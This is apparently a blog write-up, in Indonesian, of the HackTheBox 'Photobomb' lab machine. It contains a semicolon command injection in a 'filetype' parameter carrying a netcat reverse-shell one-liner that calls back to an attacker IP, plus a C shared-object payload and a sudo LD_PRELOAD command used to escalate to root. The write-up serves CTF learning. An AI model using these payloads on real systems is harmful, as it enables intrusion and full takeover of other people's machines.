---
title: "HackTheBox - Photobomb Writeups"
date: 2022-12-13 18:00:00 +07:00
categories: [WriteUps]
tags: [ctf, hackthebox, pentest, writeups]
image: 
---

# HackTheBox Photobomb Writeups

Scanning dengan Nmap dan mendapatkan 2 Port terbuka, Port SSH dan Port Http. Dan port 80 mengarah pada photobomb.htb jangan lupa untuk mengubah /etc/hosts dan menambahkan photobomb.htb

```
┌──(root㉿yupy)-[~/yp/hackthebox/Photobomb]
└─# nmap -sC -sV 10.10.11.182
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-12 17:48 PST
Nmap scan report for 10.10.11.182
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.29 seconds
```

Kita melihat pada source code html yang mengarah pada photobomb.htb/photobomb.js parameter photobomb.js kita mendapatkan User dan Password “pH0t0:b0Mb!"
```
http://pH0t0:b0Mb!@photobomb.htb/printer
```
![image](https://media.discordapp.net/attachments/740245586095112242/1054662190671605781/image.png)

Kita juga dapat melihat directory yang ada dengan dirsearch /printer yang mengarah ke /printer tetapi itu kita harus memasukan User dan Password, dan disini kita sudah mendapatkanya pada source code url: 
```
http://pH0t0:b0Mb!@photobomb.htb/printer
```
![image](https://media.discordapp.net/attachments/740245586095112242/1054662732709888010/image.png)

Disini kita bila menginputkan url diatas kita akan masuk pada tampilan photo atau galeri. Pada url photobomb.htb/printer setelah kita menginputkan User dan Password yang telah didapat dari source code tadi.
![image](https://media.discordapp.net/attachments/740245586095112242/1054663023530356766/image.png)

Selanjutnya bila kita request dengan burp suite pada menu Download gambar, akan mendapatkan Post Request yang bisa kita exploitasikan. yang kemungkinan ini vulnerability SSRF (Server Side Request Forgery) yang bisa kita exploitasikan dengan menginputkan url yang kita inginkan, dan RCE (Remote Code Execution) yang akan kita gunakan untuk mendapatkan reverse shell.
![image](https://media.discordapp.net/attachments/740245586095112242/1054663349499080814/image.png)

Disini kita dapat meexploitasikan pada parameter 
```
filetype:jpg
``` 
dan menambahkan “;” untuk trigger backconnect ke server. Kita disini dapat menambahkan reverse shell dengan membuat reverse shell pada revshell.com. payload yang kita gunakan 
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.16 1337 >/tmp/f
```
dengan kita encode url menjadi 
```
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.14.16%201337%20%3E%2Ftmp%2Ff
```

![image](https://media.discordapp.net/attachments/740245586095112242/1054664402240012378/image.png)

Setelah kita send request kita dapat backconnect dengan pc kita sendiri dan kita mencoba mencari lebih dalam pada server dan biasanya kita mengecek local privileges nya pada sudoers apakah kita dapat menaikan user biasa ke user root dengan melihat sudoers.

![image](https://media.discordapp.net/attachments/740245586095112242/1054664555877380176/image.png)

Disini sudoers dapat masuk dengan /opt/cleanup.sh secara langsung. Dan kita mencoba membaca dan mencari  file /opt/cleanup.sh kerentanan apa yang terdapat pada file tersebut.

![image](https://media.discordapp.net/attachments/740245586095112242/1054664805820149760/image.png)

![image](https://media.discordapp.net/attachments/740245586095112242/1054664963819581490/image.png)

Selanjutnya kita mencoba exploitasikan ```/opt/cleanup.sh``` dengan cara yang saya dapatkan dari [artikel](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/). Disini kita mencoba upload ```shell.so``` yang telah kita compile dan kita upload ke dalam server target.
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```
![image](https://media.discordapp.net/attachments/740245586095112242/1054665393941266452/image.png)

Setelah berhasil ke upload pada server target kita gunakan shell.so untuk local privileges. Dengan payload ini kita dapat menaikan user biasa ke root. 
```
sudo LD_PRELOAD=./shell.so /opt/cleanup.sh
```
![image](https://media.discordapp.net/attachments/740245586095112242/1054665794287579206/image.png)

![image](https://media.discordapp.net/attachments/740245586095112242/1054665911157669898/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1054666533386858526/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1054666701435830282/image.png?width=659&height=606)
